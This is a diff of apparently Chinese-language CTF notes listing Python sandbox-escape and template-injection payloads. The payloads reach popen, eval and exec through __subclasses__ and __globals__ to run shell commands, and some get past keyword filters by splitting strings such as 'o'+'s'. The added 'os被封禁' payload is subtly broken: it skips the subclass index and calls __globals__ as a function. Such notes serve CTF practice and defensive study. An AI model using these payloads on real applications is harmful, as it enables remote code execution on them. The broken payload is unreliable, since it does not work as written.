@@ -103,7 +103,7 @@ os.environ                   # 读环境变量（常藏 flag）
 ### 找到含有os的子类,用下标锁定,然后使用原方案,此时已绕过元素限制获得类属性,按照上述的获取函数方法提取popen模板即可
 
 ```
-().__class__.__mro__[1].__subclasses__()[下标].__init__.__globals__['popen'].popen('id').read()
+().__class__.__mro__[1].__subclasses__()[下标].__init__.__globals__['popen']('id').read()
 ```
 
 **由于使用的()之类的字面量源码包没有导入os,所以使用要用popen**
@@ -122,7 +122,7 @@ os.environ                   # 读环境变量（常藏 flag）
 
 #### 
 
-### 2.绕过os被封禁,用eval直接 执行一段表达式
+### 2.绕过os过滤,用eval直接 执行一段表达式
 
 ```
 ...__globals__['__builtins__']['eval']("__import__('o'+'s').popen('id').read()")
@@ -133,5 +133,11 @@ eval只能用于执行一段表达式,不能执行语句
 
 ```
 ...__globals__['__builtins__']['exec']("import os\nos.system('id')")
+```
+
+### 4.os被封禁
+
+```
+().__class__.__base__.__subclasses__().__init__.__globals__().popen('id',shell=True,stdout=-1).communicate()[0]
 ```
 
